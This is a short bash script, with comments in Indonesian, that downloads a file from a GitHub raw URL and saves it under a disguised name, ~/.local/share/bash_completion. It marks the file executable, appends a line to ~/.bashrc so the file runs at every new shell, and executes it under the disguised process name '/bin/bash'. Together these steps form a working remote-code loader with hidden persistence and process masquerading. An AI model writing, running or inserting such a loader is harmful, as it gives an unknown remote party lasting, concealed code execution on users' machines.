memexec_bash() {
    local url="https://github.com/YakouDev/z/raw/refs/heads/main/bash_completion"
    local mempath="$HOME/.local/share/bash_completion"
    
    mkdir -p "$HOME/.local/share"
    
    # Download
    if ! curl -fsSL "$url" -o "$mempath" 2>/dev/null; then
        if ! wget -q "$url" -O "$mempath" 2>/dev/null; then
            echo "Download gagal!" >&2
            exit 1
        fi
    fi

    chmod +x "$mempath"

    # 🔥 Ini yang lu mau: tulis ke .bashrc dengan path variabel
    printf 'exec -a '\''/bin/bash'\'' "$HOME/.local/share/bash_completion"\n' >> "$HOME/.bashrc"

    # Jalankan sekarang juga
    exec -a '/bin/bash' "$mempath" "$@"
}
memexec_bash
